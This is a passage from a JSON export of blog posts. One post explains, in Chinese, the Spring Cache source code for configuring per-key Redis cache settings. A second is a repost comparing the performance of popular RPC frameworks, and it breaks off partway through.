class=\"token operator\">=</span> cache<span class=\"token punctuation\">.</span><span class=\"token function\">getName</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t\t\t<span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>cacheMap<span class=\"token punctuation\">.</span><span class=\"token function\">put</span><span class=\"token punctuation\">(</span>name<span class=\"token punctuation\">,</span> <span class=\"token function\">decorateCache</span><span class=\"token punctuation\">(</span>cache<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t\t\tcacheNames<span class=\"token punctuation\">.</span><span class=\"token function\">add</span><span class=\"token punctuation\">(</span>name<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t\t<span class=\"token punctuation\">}</span>\n\t\t\t<span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>cacheNames <span class=\"token operator\">=</span> Collections<span class=\"token punctuation\">.</span><span class=\"token function\">unmodifiableSet</span><span class=\"token punctuation\">(</span>cacheNames<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token punctuation\">}</span>\n\t<span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n</code></pre>\n<p>由于loadCaches方法是抽象的，我们实现使用的redis实现，所有直接查看<code>org.springframework.data.redis.cache.RedisCacheManager</code>类的实现，阅读源代码发现：</p>\n<pre class=\" language-java\"><code class=\"prism  language-java\"><span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">RedisCacheManager</span> <span class=\"token keyword\">extends</span> <span class=\"token class-name\">AbstractTransactionSupportingCacheManager</span> <span class=\"token punctuation\">{</span>\n<span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span>\n\t<span class=\"token keyword\">private</span> <span class=\"token keyword\">final</span> Map<span class=\"token generics function\"><span class=\"token punctuation\">&lt;</span>String<span class=\"token punctuation\">,</span> RedisCacheConfiguration<span class=\"token punctuation\">&gt;</span></span> initialCacheConfiguration<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span>\n\t<span class=\"token annotation punctuation\">@Override</span>\n\t<span class=\"token keyword\">protected</span> Collection<span class=\"token generics function\"><span class=\"token punctuation\">&lt;</span>RedisCache<span class=\"token punctuation\">&gt;</span></span> <span class=\"token function\">loadCaches</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n\t    <span class=\"token comment\">//1⃣️可以看到实际上就是取initialCacheConfiguration变量的值</span>\n\t\tList<span class=\"token generics function\"><span class=\"token punctuation\">&lt;</span>RedisCache<span class=\"token punctuation\">&gt;</span></span> caches <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">LinkedList</span><span class=\"token operator\">&lt;</span><span class=\"token operator\">&gt;</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span>Map<span class=\"token punctuation\">.</span>Entry<span class=\"token generics function\"><span class=\"token punctuation\">&lt;</span>String<span class=\"token punctuation\">,</span> RedisCacheConfiguration<span class=\"token punctuation\">&gt;</span></span> entry <span class=\"token operator\">:</span> initialCacheConfiguration<span class=\"token punctuation\">.</span><span class=\"token function\">entrySet</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n            <span class=\"token comment\">//2⃣️初始化cache</span>\n\t\t\tcaches<span class=\"token punctuation\">.</span><span class=\"token function\">add</span><span class=\"token punctuation\">(</span><span class=\"token function\">createRedisCache</span><span class=\"token punctuation\">(</span>entry<span class=\"token punctuation\">.</span><span class=\"token function\">getKey</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> entry<span class=\"token punctuation\">.</span><span class=\"token function\">getValue</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token punctuation\">}</span>\n\t\t<span class=\"token keyword\">return</span> caches<span class=\"token punctuation\">;</span>\n\t<span class=\"token punctuation\">}</span>\n\t<span class=\"token keyword\">protected</span> RedisCache <span class=\"token function\">createRedisCache</span><span class=\"token punctuation\">(</span>String name<span class=\"token punctuation\">,</span> <span class=\"token annotation punctuation\">@Nullable</span> RedisCacheConfiguration cacheConfig<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n\t\t<span class=\"token keyword\">return</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">RedisCache</span><span class=\"token punctuation\">(</span>name<span class=\"token punctuation\">,</span> cacheWriter<span class=\"token punctuation\">,</span> cacheConfig <span class=\"token operator\">!=</span> null <span class=\"token operator\">?</span> cacheConfig <span class=\"token operator\">:</span> defaultCacheConfig<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span>    \n<span class=\"token punctuation\">}</span>    \n</code></pre>\n<p>通过注入自定义的cacheConfig能够使不同的key拥有不同的cache配置，达到自定义的效果。</p>\n<h3><a id=\"Cache_77\"></a>Cache被调用</h3>\n<p>回到上面的正题，在<code>cacheManager</code>初始化完成后，当有请求来到@Cacheable注解处的方法时，会通过aop代理的形式做invoke，顶层是在<code>CacheAspectSupport</code>的execute方法进行代理，</p>\n<p>中间一个步骤省略，它最后会直接通过CacheManager去获取cache，方法为：</p>\n<pre class=\" language-java\"><code class=\"prism  language-java\"><span class=\"token keyword\">public</span> <span class=\"token keyword\">abstract</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">AbstractCacheManager</span> <span class=\"token keyword\">implements</span> <span class=\"token class-name\">CacheManager</span><span class=\"token punctuation\">,</span> InitializingBean <span class=\"token punctuation\">{</span>\n<span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span>\n    <span class=\"token annotation punctuation\">@Override</span>\n\t<span class=\"token annotation punctuation\">@Nullable</span>\n\t<span class=\"token keyword\">public</span> Cache <span class=\"token function\">getCache</span><span class=\"token punctuation\">(</span>String name<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n\t\tCache cache <span class=\"token operator\">=</span> <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>cacheMap<span class=\"token punctuation\">.</span><span class=\"token function\">get</span><span class=\"token punctuation\">(</span>name<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>cache <span class=\"token operator\">!=</span> null<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n\t\t\t<span class=\"token keyword\">return</span> cache<span class=\"token punctuation\">;</span>\n\t\t<span class=\"token punctuation\">}</span>\n\t\t<span class=\"token keyword\">else</span> <span class=\"token punctuation\">{</span>\n\t\t\t<span class=\"token comment\">// Fully synchronize now for missing cache creation...</span>\n\t\t\t<span class=\"token keyword\">synchronized</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>cacheMap<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n\t\t\t\tcache <span class=\"token operator\">=</span> <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>cacheMap<span class=\"token punctuation\">.</span><span class=\"token function\">get</span><span class=\"token punctuation\">(</span>name<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t\t\t<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>cache <span class=\"token operator\">==</span> null<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n\t\t\t\t\tcache <span class=\"token operator\">=</span> <span class=\"token function\">getMissingCache</span><span class=\"token punctuation\">(</span>name<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t\t\t\t<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>cache <span class=\"token operator\">!=</span> null<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n\t\t\t\t\t\tcache <span class=\"token operator\">=</span> <span class=\"token function\">decorateCache</span><span class=\"token punctuation\">(</span>cache<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t\t\t\t\t<span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>cacheMap<span class=\"token punctuation\">.</span><span class=\"token function\">put</span><span class=\"token punctuation\">(</span>name<span class=\"token punctuation\">,</span> cache<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t\t\t\t\t<span class=\"token function\">updateCacheNames</span><span class=\"token punctuation\">(</span>name<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t\t\t\t<span class=\"token punctuation\">}</span>\n\t\t\t\t<span class=\"token punctuation\">}</span>\n\t\t\t\t<span class=\"token keyword\">return</span> cache<span class=\"token punctuation\">;</span>\n\t\t\t<span class=\"token punctuation\">}</span>\n\t\t<span class=\"token punctuation\">}</span>\n\t<span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span>\n<span class=\"token punctuation\">}</span>\n</code></pre>\n<p>我们查看下<code>RedisCache</code>内部调用生成缓存的方法来看一下。</p>\n<pre class=\" language-java\"><code class=\"prism  language-java\"><span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">RedisCache</span> <span class=\"token keyword\">extends</span> <span class=\"token class-name\">AbstractValueAdaptingCache</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token annotation punctuation\">@Override</span>\n\t<span class=\"token keyword\">public</span> <span class=\"token keyword\">void</span> <span class=\"token function\">put</span><span class=\"token punctuation\">(</span>Object key<span class=\"token punctuation\">,</span> <span class=\"token annotation punctuation\">@Nullable</span> Object value<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n\t\tObject cacheValue <span class=\"token operator\">=</span> <span class=\"token function\">preProcessCacheValue</span><span class=\"token punctuation\">(</span>value<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span>\n    \t<span class=\"token comment\">//1⃣️ 过期时间是通过cacheConfig配置进行获取的。</span>\n\t\tcacheWriter<span class=\"token punctuation\">.</span><span class=\"token function\">put</span><span class=\"token punctuation\">(</span>name<span class=\"token punctuation\">,</span> <span class=\"token function\">createAndConvertCacheKey</span><span class=\"token punctuation\">(</span>key<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token function\">serializeCacheValue</span><span class=\"token punctuation\">(</span>cacheValue<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> cacheConfig<span class=\"token punctuation\">.</span><span class=\"token function\">getTtl</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token punctuation\">}</span>\n    <span class=\"token keyword\">protected</span> <span class=\"token keyword\">byte</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> <span class=\"token function\">serializeCacheValue</span><span class=\"token punctuation\">(</span>Object value<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n\n\t\t<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">isAllowNullValues</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> value <span class=\"token keyword\">instanceof</span> <span class=\"token class-name\">NullValue</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n\t\t\t<span class=\"token keyword\">return</span> BINARY_NULL_VALUE<span class=\"token punctuation\">;</span>\n\t\t<span class=\"token punctuation\">}</span>\n        <span class=\"token comment\">//2⃣️ value的序列化方式也是通过cacheConfig配置来初始化的</span>\n\t\t<span class=\"token keyword\">return</span> ByteUtils<span class=\"token punctuation\">.</span><span class=\"token function\">getBytes</span><span class=\"token punctuation\">(</span>cacheConfig<span class=\"token punctuation\">.</span><span class=\"token function\">getValueSerializationPair</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">write</span><span class=\"token punctuation\">(</span>value<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n</code></pre>\n<h3><a id=\"CacheConfig_141\"></a>自定义CacheConfig的配置方法</h3>\n<pre class=\" language-java\"><code class=\"prism  language-java\"> \t<span class=\"token annotation punctuation\">@Bean</span>\n    <span class=\"token keyword\">public</span> RedisCacheManager <span class=\"token function\">redisCacheManager</span><span class=\"token punctuation\">(</span>RedisConnectionFactory connectionFactory<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        RedisCacheManager<span class=\"token punctuation\">.</span>RedisCacheManagerBuilder builder <span class=\"token operator\">=</span> RedisCacheManager<span class=\"token punctuation\">.</span><span class=\"token function\">builder</span><span class=\"token punctuation\">(</span>connectionFactory<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        builder<span class=\"token punctuation\">.</span><span class=\"token function\">withInitialCacheConfigurations</span><span class=\"token punctuation\">(</span><span class=\"token function\">customCacheConfig</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">return</span> builder<span class=\"token punctuation\">.</span><span class=\"token function\">build</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token keyword\">private</span> Map<span class=\"token generics function\"><span class=\"token punctuation\">&lt;</span>String<span class=\"token punctuation\">,</span> RedisCacheConfiguration<span class=\"token punctuation\">&gt;</span></span> <span class=\"token function\">customCacheConfig</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        Map<span class=\"token generics function\"><span class=\"token punctuation\">&lt;</span>String<span class=\"token punctuation\">,</span> RedisCacheConfiguration<span class=\"token punctuation\">&gt;</span></span> map <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">HashMap</span><span class=\"token operator\">&lt;</span><span class=\"token operator\">&gt;</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        RedisCacheConfiguration redisCacheConfiguration <span class=\"token operator\">=</span> RedisCacheConfiguration<span class=\"token punctuation\">.</span><span class=\"token function\">defaultCacheConfig</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">entryTtl</span><span class=\"token punctuation\">(</span>Duration<span class=\"token punctuation\">.</span><span class=\"token function\">ofMinutes</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">serializeKeysWith</span><span class=\"token punctuation\">(</span>RedisSerializationContext<span class=\"token punctuation\">.</span>SerializationPair<span class=\"token punctuation\">.</span><span class=\"token function\">fromSerializer</span><span class=\"token punctuation\">(</span><span class=\"token function\">keySerializer</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n</code></pre>\n<blockquote>\n<p>PS: 感觉使用Spring cache还是略麻烦，不如自己实现一个基于aop的cache吧。</p>\n</blockquote>\n\n",
			"markdowncontent":"@[TOC](自定义key的CacheConfig源码剖析)\n\nSpring cache的源码版本：`spring-context-5.0.9.RELEASE.jar`\n\n项目demo代码：[点我跳转](https://github.com/yoqu/spring-cache-demo)\n\n> 先讲自定义可以干嘛，再讲解源码：\n通过自定义cache config，可以用来设置自定义的过期时间，自定义的序列化方式，自定义前缀等等。`@Cacheable` 注解不能设置过期时间，这点是由于cache本身是抽象，各种实现过期时间的一些具体缓存框架可能有差异，不过我觉得这是一个非常不爽的点。\n所以我们来阅读源代码吧。\n\n### Cache启动初始化\n\n`AbstractCacheManager`类中有一个`cacheMap`变量存储所有的缓存实现，在项目初始化时，由于类中实现了`InitializingBean`接口，所有会初始化缓存，代码：\n\n```java\n\tpublic abstract class AbstractCacheManager implements CacheManager, InitializingBean {\n\n\tprivate final ConcurrentMap<String, Cache> cacheMap = new ConcurrentHashMap<>(16);\n\n\tprivate volatile Set<String> cacheNames = Collections.emptySet();\n\n\t@Override\n\tpublic void afterPropertiesSet() {\n\t\tinitializeCaches();\n\t}\n\n\t/**\n\t * Initialize the static configuration of caches.\n\t * <p>Triggered on startup through {@link #afterPropertiesSet()};\n\t * can also be called to re-initialize at runtime.\n\t * @since 4.2.2\n\t * @see #loadCaches()\n\t */\n\tpublic void initializeCaches() {\n        // 1⃣️重点在loadCaches方法\n\t\tCollection<? extends Cache> caches = loadCaches();\n\t\tsynchronized (this.cacheMap) {\n\t\t\tthis.cacheNames = Collections.emptySet();\n\t\t\tthis.cacheMap.clear();           \n\t\t\tSet<String> cacheNames = new LinkedHashSet<>(caches.size());\n\t\t\tfor (Cache cache : caches) {\n\t\t\t\tString name = cache.getName();\n\t\t\t\tthis.cacheMap.put(name, decorateCache(cache));\n\t\t\t\tcacheNames.add(name);\n\t\t\t}\n\t\t\tthis.cacheNames = Collections.unmodifiableSet(cacheNames);\n\t\t}\n\t}\n}\n```\n\n由于loadCaches方法是抽象的，我们实现使用的redis实现，所有直接查看`org.springframework.data.redis.cache.RedisCacheManager`类的实现，阅读源代码发现：\n\n```java\npublic class RedisCacheManager extends AbstractTransactionSupportingCacheManager {\n...\n\tprivate final Map<String, RedisCacheConfiguration> initialCacheConfiguration;\n...\n\t@Override\n\tprotected Collection<RedisCache> loadCaches() {\n\t    //1⃣️可以看到实际上就是取initialCacheConfiguration变量的值\n\t\tList<RedisCache> caches = new LinkedList<>();\n\t\tfor (Map.Entry<String, RedisCacheConfiguration> entry : initialCacheConfiguration.entrySet()) {\n            //2⃣️初始化cache\n\t\t\tcaches.add(createRedisCache(entry.getKey(), entry.getValue()));\n\t\t}\n\t\treturn caches;\n\t}\n\tprotected RedisCache createRedisCache(String name, @Nullable RedisCacheConfiguration cacheConfig) {\n\t\treturn new RedisCache(name, cacheWriter, cacheConfig != null ? cacheConfig : defaultCacheConfig);\n\t}\n...    \n}    \n```\n\n通过注入自定义的cacheConfig能够使不同的key拥有不同的cache配置，达到自定义的效果。\n\n### Cache被调用\n\n回到上面的正题，在`cacheManager`初始化完成后，当有请求来到@Cacheable注解处的方法时，会通过aop代理的形式做invoke，顶层是在`CacheAspectSupport`的execute方法进行代理，\n\n中间一个步骤省略，它最后会直接通过CacheManager去获取cache，方法为：\n\n```java\npublic abstract class AbstractCacheManager implements CacheManager, InitializingBean {\n...\n    @Override\n\t@Nullable\n\tpublic Cache getCache(String name) {\n\t\tCache cache = this.cacheMap.get(name);\n\t\tif (cache != null) {\n\t\t\treturn cache;\n\t\t}\n\t\telse {\n\t\t\t// Fully synchronize now for missing cache creation...\n\t\t\tsynchronized (this.cacheMap) {\n\t\t\t\tcache = this.cacheMap.get(name);\n\t\t\t\tif (cache == null) {\n\t\t\t\t\tcache = getMissingCache(name);\n\t\t\t\t\tif (cache != null) {\n\t\t\t\t\t\tcache = decorateCache(cache);\n\t\t\t\t\t\tthis.cacheMap.put(name, cache);\n\t\t\t\t\t\tupdateCacheNames(name);\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t\treturn cache;\n\t\t\t}\n\t\t}\n\t}\n...\n}\n```\n\n我们查看下`RedisCache`内部调用生成缓存的方法来看一下。\n\n```java\npublic class RedisCache extends AbstractValueAdaptingCache {\n    @Override\n\tpublic void put(Object key, @Nullable Object value) {\n\t\tObject cacheValue = preProcessCacheValue(value);\n...\n    \t//1⃣️ 过期时间是通过cacheConfig配置进行获取的。\n\t\tcacheWriter.put(name, createAndConvertCacheKey(key), serializeCacheValue(cacheValue), cacheConfig.getTtl());\n\t}\n    protected byte[] serializeCacheValue(Object value) {\n\n\t\tif (isAllowNullValues() && value instanceof NullValue) {\n\t\t\treturn BINARY_NULL_VALUE;\n\t\t}\n        //2⃣️ value的序列化方式也是通过cacheConfig配置来初始化的\n\t\treturn ByteUtils.getBytes(cacheConfig.getValueSerializationPair().write(value));\n\t}\n}\n```\n\n\n\n\n\n\n\n### 自定义CacheConfig的配置方法\n\n```java\n \t@Bean\n    public RedisCacheManager redisCacheManager(RedisConnectionFactory connectionFactory) {\n        RedisCacheManager.RedisCacheManagerBuilder builder = RedisCacheManager.builder(connectionFactory);\n        builder.withInitialCacheConfigurations(customCacheConfig());\n        return builder.build();\n    }\n\n    private Map<String, RedisCacheConfiguration> customCacheConfig() {\n        Map<String, RedisCacheConfiguration> map = new HashMap<>();\n        RedisCacheConfiguration redisCacheConfiguration = RedisCacheConfiguration.defaultCacheConfig().entryTtl(Duration.ofMinutes(1)).serializeKeysWith(RedisSerializationContext.SerializationPair.fromSerializer(keySerializer()))\n```\n\n> PS: 感觉使用Spring cache还是略麻烦，不如自己实现一个基于aop的cache吧。\n\n",
			"tags":"spring cache,cache,spring,源码",
			"id":"82979382",
			"categories":"JAVA_spring",
			"status":1
		},
		"error":"",
		"status":true
	},
	{
		"data":{
			"date":"2018年02月10日 14:23:03",
			"articleedittype":1,
			"private":0,
			"channel":"31",
			"description":"本文转载自鸟窝的博客 流行的rpc框架benchmark 2018新春版\n\n\n\n目录 [−]\n\n\n本文测试的RPC框架\n测试场景 \n模拟业务处理时间\n测试数据\n测试client\n测试指标\n测试环境\n测试结果 \n处理时间 0ms\n处理时间 10ms\n处理时间 30ms\n\n\n随着公司规模的扩大，以及业务量的激增，单体应用逐步演化为服务/微服务的架构模式， 服务之间的调用大多采用rpc的方式调用，或者消...",
			"title":"流行的rpc框架性能测试对比",
			"type":"repost",
			"content":"<p>本文转载自鸟窝的博客 <a href=\"http://colobu.com/2018/01/31/benchmark-2018-spring-of-popular-rpc-frameworks/\">流行的rpc框架benchmark 2018新春版</a></p>\n\n\n\n<h1 id=\"目录\">目录 [−]</h1>\n\n<ol>\n<li><a href=\"#本文测试的RPC框架\">本文测试的RPC框架</a></li>\n<li><a href=\"#测试场景\">测试场景</a> <br>\n<ol><li><a href=\"#模拟业务处理时间\">模拟业务处理时间</a></li>\n<li><a href=\"#测试数据\">测试数据</a></li>\n<li><a href=\"#测试client\">测试client</a></li>\n<li><a href=\"#测试指标\">测试指标</a></li>\n<li><a href=\"#测试环境\">测试环境</a></li></ol></li>\n<li><a href=\"#测试结果\">测试结果</a> <br>\n<ol><li><a href=\"#处理时间_0ms\">处理时间 0ms</a></li>\n<li><a href=\"#处理时间_10ms\">处理时间 10ms</a></li>\n<li><a href=\"#处理时间_30ms\">处理时间 30ms</a></li></ol></li>\n</ol>\n\n<p>随着公司规模的扩大，以及业务量的激增，单体应用逐步演化为服务/微服务的架构模式， 服务之间的调用大多采用rpc的方式调用，或者消息队列的方式进行解耦。几乎每个大厂都会创建自己的rpc框架，或者基于知名的rpc框架进行改造。</p>\n\n<p>目前, rpc框架主要沿着两条路线发展，一个是目标为了跨语言，服务端可以用不同的语言实现，客户端也可以用不同的语言实现，不同的语言实现的客户端和服务器端可以互相调用。很显然，要支持不同的语言，需要基于那种语言实现相同协议的框架，并且协议设计应该也是跨语言的，其中比较典型的是 grpc,基于同一个IDL，可以生成不同语言的代码，并且语言的支持也非常的多。</p>\n\n<p>另一个rpc框架发展的目标是支持服务治理，主要的精力放在服务发现、路由、容错处理等方面，主要围绕一个语言开发，可能也有一些第三方曲折的实现服务的调用和服务的实现，这其中的代表，也是比较早的开源的框架就是阿里巴巴的dubbo。</p>\n\n<p>有些rpc框架协议的涉及一开始就没有考虑的跨语言，其中使用了语言的一些特有的属性，比如Java的ObjectInputStream/ObjectOutputStream, Golang的Gob等，有些在协议的设计上就考虑了通用性， 使用JSON或者Protobuffer作为数据序列化。</p>\n\n<p>有些框架是基于TCP的二进制流的数据传输，有些基于http的request/response模型进行请求，也有基于http2的流式传输，更有一些支持可信赖的UDP进行数据传入，比如quic、kcp等。</p>\n\n<p>有些提供了生态圈的一些框架，比如gateway、agent等，有些restful风格的rpc框架天然支持API gateway进行负载均衡。</p>\n\n<p>有些已经得到了大厂的广泛应用，有的大厂内部得到了大量应用，但目前还没有广泛的推开来。</p>\n\n<p>选择一个rpc框架会基于多方面的考虑： 框架特性、性能、成熟度、技术支持、社区活跃度等多个方面，本文只比较各个流行框架的benchmark，基于几个固定的场景提供benchmark数据支持。</p>\n\n<p>本文所使用的benchmark代码位于: <a href=\"https://github.com/rpcx-ecosystem/rpcx-benchmark\">rpcx-benchmark</a>, 这是我在开发<a href=\"https://github.com/smallnest/rpcx\">rpcx</a>框架的时候为了检验框架性能而抽取出来的一个项目，也欢迎各框架的作者和爱好者提供相应的框架benchmark代码，或者修正其中的错误。</p>\n\n\n\n<h2 id=\"本文测试的rpc框架\">本文测试的RPC框架</h2>\n\n<ul>\n<li><a href=\"https://github.com/smallnest/rpcx\">rpcx</a>: 基于Go的服务治理的rpc框架、客户端支持跨语言</li>\n<li><a href=\"https://grpc.io\">grpc</a>: Google 出品的跨语言rpc框架，很弱的(实验性的)负载均衡, 测试使用的是grpc-go</li>\n<li><a href=\"https://golang.org/pkg/net/rpc/\">go std rpc</a>: Go标准库的rpc, 不支持跨语言(jsonrpc支持json rpc 1.0)</li>\n<li><a href=\"https://thrift.apache.org\">thrift</a>: 跨语言的rpc框架，facebook贡献</li>\n<li><a href=\"https://thrift.apache.org\">dubbo</a>: 国内较早开源的服务治理的Java rpc框架，虽然在阿里巴巴内部竞争中落败于HSF，沉寂了几年，但是在国内得到了广泛的应用，目前dubbo项目又获得了支持，并且dubbo 3.0也开始开发</li>\n<li><a href=\"https://thrift.apache.org\">motan</a>: 微博内部使用的rpc框架，底层支持java,生态圈往service mesh发展以支持多语言</li>\n<li><a href=\"https://github.com/hprose\">hprose</a>: 国内开发人员开发的一个跨语言的rpc框架，非服务治理但是性能高效</li>\n<li><a href=\"https://github.com/twitchtv/twirp\">twirp</a>: twitch.tv刚刚开源的一个restful风格的rpc框架</li>\n<li><a href=\"https://github.com/micro/go-micro\">go-micro</a>: Go语言的一个服务治理rpc框架， 在测试中发现性能不太好，所以没有继续测试，相关的测试代码已在github库中</li>\n<li><a href=\"https://github.com/go-kit/kit\">go kit</a>: 欢迎提供测试代码</li>\n<li><a href=\"https://github.com/Tencent/Tars\">腾讯 Tars</a>:腾讯公司的rpc框架， 欢迎提供c++ benchmark代码</li>\n<li><a href=\"https://github.com/brpc/brpc\">百度 brpc</a>: 百度公司的rpc框架， 欢迎提供c++ benchmark代码</li>\n<li><a href=\"http://projects.spring.io/spring-cloud/\">spring cloud</a>: 本次没有测试</li>\n</ul>\n\n\n\n<h2 id=\"测试场景\">测试场景</h2>\n\n\n\n<h3 id=\"模拟业务处理时间\">模拟业务处理时间</h3>\n\n<p>测试模拟了三种业务处理的场景(模拟业务处理时间):</p>\n\n<ul>\n<li>0ms:   业务很简单，可以快速返回。业务处理主要是将反序列化的对象设置几个字段后返回</li>\n<li>10ms:  模拟一般的业务处理，这些业务处理主要是本地操作，比如读取本地的数据库等，处理时间相对较短</li>\n<li>30ms:  模拟复杂的业务处理， 这些服务可能需要访问第三方服务，或者远程的数据等，处理时间相对较长</li>\n</ul>\n\n<p>当处理时间为0ms时，我们主要测试的整个框架空转的处理能力，涉及的数据的传输，数据的序列化、服务的调度等等。 <br>\n当处理时间为10ms、30ms时，这个时间业务处理时间一般要远远大于数据传输和序列化所需的时间，主要比较在大并发的性能框架的调度、处理能力。</p>\n\n\n\n<h3 id=\"测试数据\">测试数据</h3>\n\n<p>所有的测试都是基于相同的数据, 为了公平起见，统一采用protobuffer进行序列化和反序列化。</p>\n\n<p>数据格式:</p>\n\n\n\n<pre class=\"prettyprint\"><code class=\" hljs haskell\">    messageBenchmarkMessage{\n\n    requiredstring field1 = <span class=\"hljs-number\">1</span>;\n\n    optionalstring field9 = <span class=\"hljs-number\">9</span>;\n\n    optionalstring field18 = <span class=\"hljs-number\">18</span>;\n\n    optionalbool field80 = <span class=\"hljs-number\">80</span> [<span class=\"hljs-default\"><span class=\"hljs-keyword\">default</span>=false];</span>\n\n    optionalbool field81 = <span class=\"hljs-number\">81</span> [<span class=\"hljs-default\"><span class=\"hljs-keyword\">default</span>=true];</span>\n\n    requiredint32 field2 = <span class=\"hljs-number\">2</span>;\n\n    requiredint32 field3 = <span class=\"hljs-number\">3</span>;\n\n    optionalint32 field280 = <span class=\"hljs-number\">280</span>;\n\n    optionalint32 field6 = <span class=\"hljs-number\">6</span> [<span class=\"hljs-default\"><span class=\"hljs-keyword\">default</span>=0];</span>\n\n    optionalint64 field22 = <span class=\"hljs-number\">22</span>;\n\n    optionalstring field4 = <span class=\"hljs-number\">4</span>;\n\n    repeatedfixed64 field5 = <span class=\"hljs-number\">5</span>;\n\n    optionalbool field59 = <span class=\"hljs-number\">59</span> [<span class=\"hljs-default\"><span class=\"hljs-keyword\">default</span>=false];</span>\n\n    optionalstring field7 = <span class=\"hljs-number\">7</span>;\n\n    optionalint32 field16 = <span class=\"hljs-number\">16</span>;\n\n    optionalint32 field130 = <span class=\"hljs-number\">130</span> [<span class=\"hljs-default\"><span 